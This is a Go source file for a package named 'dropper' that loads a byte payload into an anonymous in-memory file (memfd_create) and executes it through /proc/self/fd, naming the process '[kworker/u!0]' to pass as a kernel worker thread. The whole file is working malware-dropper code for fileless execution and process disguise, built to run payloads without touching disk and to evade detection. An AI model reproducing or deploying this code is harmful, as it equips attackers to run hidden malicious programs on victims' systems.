package dropper

import (
	"fmt"
	"syscall"

	"golang.org/x/sys/unix"
)

// referencing this https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/fexecve.c.html
// we abuse the fact /proc/self/fd/NUM will reference a custom file descriptor
// func fexecv(fd int) {

// 	// load the code in memory
// 	cmd := fmt.Sprintf("/proc/self/fd/%d", fd)
// 	// name of the program
// 	args := []string{"[kworker/u!0]", ""}

// 	pid, err := syscall.ForkExec(cmd, args, &syscall.ProcAttr{Dir: "", Files: []uintptr{uintptr(fd)}, Sys: &syscall.SysProcAttr{}})
// 	// _, err := syscall.ForkExec(cmd, args, envv)
// 	if err != nil {
// 		log.Fatal(err)
// 	}

// 	// print the new PID and the stdout
// 	fmt.Printf("%d\n", pid)

// }

func fexecv(fd int) {

	// load the code in memory
	cmd := fmt.Sprintf("/proc/self/fd/%d", fd)
	// name of the program
	args := []string{"[kworker/u!0]", ""}
	envv := []string{}

	// output, err := exec.Command(test).CombinedOutput()
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// fmt.Print(string(output))
	syscall.Exec(cmd, args, envv)
}

func LoadAndExec(data []byte) error {

	// create file descriptor
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return err
	}

	// makesure size is right
	err = unix.Ftruncate(fd, int64(len(data)))
	if err != nil {
		return err
	}

	// map the memory
	buf, err := unix.Mmap(fd, 0, len(data), unix.PROT_READ|unix.PROT_WRITE, unix.MAP_SHARED)
	if err != nil {
		return err
	}

	// and unmap
	defer unix.Munmap(buf)

	// send it over to the background
	copy(buf, data)
	fexecv(fd)
	return nil
}

func Load(data []byte) (int, error) {

	// create file descriptor
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return -1, err

	}

	// makesure size is right
	err = unix.Ftruncate(fd, int64(len(data)))
	if err != nil {
		return -1, err
	}

	// map the memory
	buf, err := unix.Mmap(fd, 0, len(data), unix.PROT_READ|unix.PROT_WRITE, unix.MAP_SHARED)
	if err != nil {
		return -1, err
	}

	// and unmap
	defer unix.Munmap(buf)

	// send it over to the background
	copy(buf, data)
	// fexecv(fd)
	return fd, nil
}
